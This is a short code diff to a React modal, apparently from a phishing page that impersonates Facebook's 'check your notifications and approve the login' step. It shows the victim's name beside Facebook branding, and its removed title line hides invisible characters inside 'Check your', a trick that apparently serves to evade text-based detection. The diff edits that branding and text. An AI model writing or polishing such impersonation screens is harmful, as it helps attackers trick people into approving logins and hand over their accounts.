@@ -153,11 +153,8 @@ function PhoneVerify({ setStep, Step, Name }) {
         <ModalContainer>
             <ModalContent>
                 <div className='text-start'>
-                    <span style={{ fontWeight: 500, fontSize: '14px' }}>
-                        {Name ? Name.split(' ')[0].charAt(0).toUpperCase() + Name.split(' ')[0].slice(1) + ' ' +  (Name.split(' ')[1] ? Name.split(' ')[1].charAt(0).toUpperCase() + Name.split(' ')[1].slice(1) : '') : ''} • Facebook
-                    </span>
                     <ModalTitle>
-                        C‎h‎eck y‎o‎ur notifications on another device
+                        Check your notifications on another device
                     </ModalTitle>
                     <SmallText>
                         We sent a notification to your Phone or PC. Check your Facebook notifications there and approve the login to continue.
